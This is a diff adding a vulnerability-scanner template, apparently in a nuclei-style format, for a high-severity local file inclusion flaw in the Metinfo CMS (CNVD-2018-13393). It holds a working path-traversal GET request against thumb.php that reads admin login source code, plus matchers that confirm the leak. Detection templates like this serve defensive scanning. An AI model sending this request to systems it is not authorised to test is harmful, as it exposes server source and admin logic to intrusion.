@@ -1,0 +1,24 @@
+## id: CNVD-2018-13393
+## name: Metinfo - Local File Inclusion
+## author: hack007x
+## severity: high
+## tags: cnvd2018,cnvd,metinfo,cvnd2018,lfi,vuln
+## description: Metinfo is susceptible to local file inclusion.
+## cvss-score: 8.6
+## reference: https://paper.seebug.org/676/
+## verification: true
+
+GET /include/thumb.php?dir=http\..\admin\login\login_check.php HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ follow_redirects: true
+#@ condition: and
+#@ matcher: body contains "<?php"
+#@ matcher: body contains "login_met_cookie($metinfo_admin_name);"
+
+
+
+
+
+# @VEIL-STAMP: 88ff12c3ef193236c89a940d893ec8fa5af32f0b6e0d18c675af73ec8ea195f5
